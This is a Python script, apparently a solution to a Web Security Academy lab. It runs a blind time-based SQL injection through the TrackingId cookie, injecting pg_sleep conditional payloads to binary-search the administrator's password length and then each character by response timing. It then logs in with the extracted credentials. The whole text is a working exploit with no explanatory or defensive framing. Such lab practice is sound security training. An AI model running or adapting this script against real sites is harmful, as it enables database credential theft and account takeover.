import requests
from lxml import html

URL = "https://0a6f00ae03529ed18128bbf6006e002b.web-security-academy.net/"
session = requests.Session()
cookie = {
    "TrackingId": ""
}

# Find password length

password_len = -1

payload = "'||(CASE WHEN ({}>=(SELECT LENGTH(password) FROM users WHERE username='administrator')) THEN pg_sleep(2) ELSE '' END)--"
    
l = 1
r = 100

while l < r:
    mid = (l + r) >> 1
    cookie["TrackingId"] = payload.format(mid)
    ok = False
    
    try:
        session.get(URL, cookies=cookie, timeout=2)
    except requests.exceptions.Timeout:
        ok = True
        
    if ok:
        r = mid
    else:
        l = mid + 1

password_len = l

# Find password

payload = "'||(CASE WHEN ({}>=ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{},1))) THEN pg_sleep(2) ELSE '' END)--"

username = "administrator"
password = ""

for i in range(1, password_len + 1):
    l = 32
    r = 127
    
    while l < r:
        mid = (l + r) >> 1
        
        cookie["TrackingId"] = payload.format(mid, i)
        ok = False
        
        try:
            session.get(URL, cookies=cookie, timeout=2)
        except requests.exceptions.Timeout:
            ok = True
        
        if ok:
            r = mid
        else:
            l = mid + 1
            
    password += chr(l)
    
# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)